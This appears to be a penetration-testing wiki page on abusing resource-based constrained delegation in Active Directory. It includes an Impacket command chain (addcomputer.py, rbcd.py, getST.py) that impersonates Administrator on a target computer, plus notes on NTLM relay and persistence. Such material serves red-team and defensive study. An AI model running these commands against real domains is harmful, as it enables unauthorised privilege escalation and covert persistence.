---
title: "Resource-based constrained delegation: impersonation from a writable object"
description: "Abusing resource-based constrained delegation (RBCD) by writing msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer object to let a controlled account impersonate any user to that target, the common relay and ACL escalation path."
keywords:
  - RBCD
  - resource-based constrained delegation
  - msDS-AllowedToActOnBehalfOfOtherIdentity
  - machine account quota
  - S4U
---

# Resource-based constrained delegation

Resource-based constrained delegation (RBCD) flips where the delegation trust is stored. Instead of the delegating account listing its targets, the **target** computer names who may impersonate users to it, in `msDS-AllowedToActOnBehalfOfOtherIdentity`. That makes it an escalation primitive: if you can **write** that attribute on a computer object, you can point it at an account you control and then impersonate anyone to that computer.

## The attack

Two things are needed: write access to the target's attribute, and an account with an SPN to delegate from.

```bash
# 1. Create a computer account to delegate from (default quota allows 10 per user)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' example.local/user:pass

# 2. Write the delegation attribute on the target (needs write over the target object)
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
  example.local/user:pass

# 3. S4U: impersonate a privileged user to a service on the target
getST.py -spn cifs/target.example.local -impersonate Administrator \
  -hashes :<EVIL$-hash> example.local/EVIL$
```

The write permission in step 2 typically comes from an ACL finding ([ACL enumeration](../../../dacl/acl-enumeration.md)): `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDacl` over the computer object.

## Two common sources of the write

- **An abusable ACL** over a computer object (from BloodHound), the direct path.
- **NTLM relay to LDAP**: relaying a coerced machine authentication to LDAP and setting RBCD on the victim computer, so coercion plus relay yields local admin on that machine ([NTLM relay](../../ntlm/relay.md)).

The account to delegate *from* needs an SPN; the usual trick is creating a new computer account, which has one and which the default **machine account quota** (`ms-DS-MachineAccountQuota = 10`) lets any domain user do.

## Exploitation notes

- RBCD is reversible and quiet to set: writing one attribute grants durable impersonation to the target, making it a favourite escalation and a persistence foothold.
- Where the machine account quota is 0, use an existing account you control that has (or can be given) an SPN instead of creating a new computer.
- The result is a forwardable ticket as the impersonated user to the target's services; aim at `cifs/` or `host/` for file access or execution.

## Tools

- **Impacket** (`rbcd.py`, `addcomputer.py`, `getST.py`): the full write-then-S4U chain.
- **PowerView / Powermad**: set the attribute and add computer accounts from Windows.
- **ntlmrelayx.py `--delegate-access`**: set RBCD via relayed LDAP.

## References

- The Hacker Recipes: resource-based constrained delegation
- Microsoft: msDS-AllowedToActOnBehalfOfOtherIdentity
